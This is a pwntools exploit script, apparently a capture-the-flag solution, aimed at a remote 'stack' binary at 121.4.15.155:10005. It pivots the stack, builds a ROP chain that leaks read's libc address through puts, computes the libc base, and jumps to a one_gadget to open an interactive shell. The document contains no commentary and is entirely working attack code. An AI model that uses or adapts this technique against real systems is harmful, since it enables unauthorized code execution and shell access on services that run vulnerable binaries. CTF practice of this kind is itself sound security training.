from pwn import *

elf = ELF('./stack')
libc = ELF('./libc-2.23.so')
ld = ELF('./ld-2.23.so')

#sh = process(argv = [ld.path, elf.path], env = {"LD_PRELOAD" : libc.path})
#sh = process(elf.path)
context(arch = 'amd64', os = 'linux', log_level = 'debug')
sh = remote('121.4.15.155', 10005)
#gdb.attach(sh)

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
read_plt = elf.plt['read']
read_got = elf.got['read']
pop_rsp_3_pop_ret = 0x40128d
main = 0x4011AF
pop_rdi_ret = 0x0000000000401293
pop_rsi_pop_ret = 0x0000000000401291
one = 0xf1207

payload = p64(0x404400) + p64(pop_rdi_ret) + p64(0) + p64(pop_rsi_pop_ret) + p64(0x404300) + p64(0)
payload += p64(read_plt) + p64(pop_rsp_3_pop_ret) + p64(0x404300)
sh.recvuntil("something\n")
sh.send(payload)

sh.recvuntil("more\n")
payload = b'a' * 80 + p64(0x4040a0)
sh.send(payload)

payload = p64(0) * 3 + p64(pop_rdi_ret) + p64(read_got) + p64(puts_plt) + p64(main)
sh.sendline(payload)
addr = u64(sh.recvuntil('\x7f').ljust(8, b'\x00'))
print(hex(addr))

#libc_base = addr - 0xf7310
libc_base = addr - libc.sym['read']
one_gadget = libc_base + one

payload = p64(0x404400) + p64(one_gadget)
sh.recvuntil("something\n")
sh.sendline(payload)

sh.recvuntil("more\n")
payload = b'a' * 80 + p64(0x4040a0)
sh.send(payload)



sh.interactive()


